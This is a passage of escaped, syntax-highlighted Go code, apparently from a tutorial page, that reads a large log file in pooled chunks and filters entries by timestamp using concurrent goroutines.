\u003cspan style=\"color:#a6e22e\"\u003elogCreationTimeString\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;can not able to parse time : \u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elastLogCreationTime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAfter\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003equeryStartTime\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elastLogCreationTime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBefore\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003equeryFinishTime\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eProcess\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003efile\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003equeryStartTime\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003equeryFinishTime\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\\nTime taken - \u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSince\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eProcess\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eos\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFile\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003estart\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTime\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTime\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elinesPool\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePool\u003c/span\u003e{\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{} {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003elines\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make([]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e250\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1024\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elines\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003estringPool\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePool\u003c/span\u003e{\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{} {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003elines\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elines\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebufio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewReader\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWaitGroup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elinesPool\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGet\u003c/span\u003e().([]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRead\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e[:\u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEOF\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003enextUntillNewline\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadBytes\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEOF\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e = append(\u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003enextUntillNewline\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003eProcessChunk\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebuf\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003elinesPool\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003estringPool\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003estart\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDone\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ewg\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWait\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eProcessChunk\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003echunk\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003elinesPool\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePool\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003estringPool\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePool\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003estart\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTime\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eend\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTime\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewg2\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esync\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWaitGroup\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elogs\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estringPool\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGet\u003c/span\u003e().(\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elogs\u003c/span\u003e = string(\u003cspan style=\"color:#a6e22e\"\u003echunk\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elinesPool\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePut\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003echunk\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003elogsSlice\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estrings\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSplit\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003elogs\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\\n\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003estringPool\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePut\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003elogs\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003echunkSize\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e300\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003elogsSlice\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003enoOfThread\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003echunkSize\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003en\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003echunkSize\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003enoOfThread\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u0026lt; (\u003cspan style=\"color:#a6e22e\"\u003enoOfThread\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003ewg2\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ewg2\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDone\u003c/span\u003e() \u003cspan style=\"color:#75715e\"\u003e// to avaoid deadlocks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u0026lt; \u003cspan style=\"color:#a6e22e\"\u003ee\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#a6e22e\"\u003etext\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elogsSlice\u003c/span\u003e[\u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(\u003cspan style=\"color:#a6e22e\"\u003etext\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\t\u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#a6e22e\"\u003elogSlice\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estrings\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSplitN\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003etext\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;,\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#a6e22e\"\u003elogCreationTimeString\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elogSlice\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#a6e22e\"\u003elogCreationTime\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eParse\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2006-01-02T15:04:05.0000Z\u0026#34;\u003c/span\u003e, \u003cspan 